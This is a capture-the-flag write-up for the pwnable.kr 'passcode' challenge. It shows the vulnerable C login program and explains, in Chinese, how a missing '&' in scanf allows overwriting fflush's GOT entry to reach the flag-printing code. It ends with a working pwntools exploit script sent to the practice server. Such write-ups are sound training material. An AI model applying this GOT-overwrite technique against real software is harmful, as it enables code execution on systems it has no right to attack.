```c
#include <stdio.h>
#include <stdlib.h>
void login(){
	int passcode1;
	int passcode2;
	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);
	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);
	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}
int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");
	welcome();
	login();
	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

login()裡面的`scanf("%d", passcode1)`沒有用`&`字號 (執行時會把值存到裡面 所以我們可以構造記憶體位置塞在passcode1)

然後passcode1跟name的位置差96bytes

所以我們可以把4bytes位置塞到passcode1裡面 (scanf執行時會把值存到裡面 所以我們可以構造記憶體位置塞在passcode1中)

然後在scanf那邊在輸入我們要的值

於是把頭腦動到`fflush(stdin)`的GOT位置(0x0804a000)

然後在scanf那邊輸入`system("/bin/cat flag")`的指令位置(0x080485E3)

exploit: 
```python
from pwn import *
r = ssh(host='pwnable.kr',user='passcode',password='guest',port=2222).process("./passcode")
# r = process('./passcode')
print r.recv()
r.sendline('a'*96+p32(0x0804a000))
print r.recv()
r.sendline(str(0x080485E3))
print r.recv()
```
